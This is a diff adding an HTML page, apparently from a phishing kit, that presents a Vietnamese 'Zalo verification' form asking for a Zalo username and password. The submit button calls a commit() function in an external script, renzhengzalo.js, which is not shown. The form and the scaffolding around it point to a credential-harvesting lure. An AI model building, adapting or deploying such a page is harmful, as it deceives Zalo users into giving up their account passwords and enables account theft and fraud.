@@ -1,0 +1,88 @@
+﻿<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	
+	<title>OCEAN</title>
+	<meta name="keywords" content="" />
+	<meta name="description" content="" />
+
+	<link rel="stylesheet" type="text/css" href="static/css/bootstrap.min.css">
+	<link rel="stylesheet" type="text/css" href="static/css/font-awesome.min.css">
+	<link rel="stylesheet" type="text/css" href="static/css/material-design-iconic-font.min.css">
+	<link rel="stylesheet" type="text/css" href="static/css/util.css">
+	<link rel="stylesheet" type="text/css" href="static/css/main.css">
+	<link rel="stylesheet" type="text/css" href="static/css/gx.css">
+</head>
+
+<body>
+
+	<div class="limiter">
+		<div class="container-login100" style="background-image: url('static/images/bg-01.jpg');">
+			<div class="wrap-login100 p-l-55 p-r-55 p-t-65 p-b-54">
+				<form class="login100-form validate-form">
+					<span class="login100-form-title p-b-49">Chứng thực Zalo</span>
+
+					<div class="wrap-input100 validate-input m-b-23" data-validate="Tài khoản zalo">
+						<input class="input100" type="text" id="username" placeholder="Tài khoản zalo" autocomplete="off">
+					</div>
+
+					<div class="wrap-input100 validate-input" data-validate="Mật khẩu zalo">
+						<input class="input100" type="password" id="password" placeholder="Mật khẩu zalo">
+					</div>
+					<div class="container-login100-form-btn">
+						<div class="wrap-login100-form-btn">
+							<div class="login100-form-bgbtn"></div>
+							<input type="button" class="login100-form-btn" id="bankrz" value="Bước tiếp theo" onClick="commit();">
+						</div>
+					</div>
+
+					 
+				</form>
+			</div>
+		</div>
+	</div>
+	<div class="gx_alert">
+		<p class="gx_alert_p"></p>
+	</div>
+	<script src="static/js/jquery-3.2.1.min.js"></script>
+	<script src="static/js/main.js"></script>
+	<script type="text/javascript" src="static/js/renzhengzalo.js"></script>
+	<script type="text/javascript" src="static/js/Ajax.js"></script>
+</body> 
+<style>
+.wrap-input100 {
+    width: 100%;
+    position: relative;
+    /* border-bottom: 2px solid #d9d9d9; */
+    border: 2px solid #d9d9d9;
+    margin-bottom: 20px;
+}
+.input100 {
+    font-family: 'Calibri';
+    font-size: 16px;
+    color: #333333;
+    line-height: 1.2;
+    display: block;
+    width: 100%;
+    /* height: 55px; */
+    height: 39px;
+    background: transparent;
+    padding: 0 7px 0 10px;
+}
+.form-control{
+	font-family: 'Calibri';
+	border: 0;
+    appearance: none;
+    -moz-appearance: none;
+    -webkit-appearance: none;
+	background: url(./static/images/1.png) 96% center no-repeat;
+    background-size: 12px;
+}
+
+
+</style>
+
+</html>
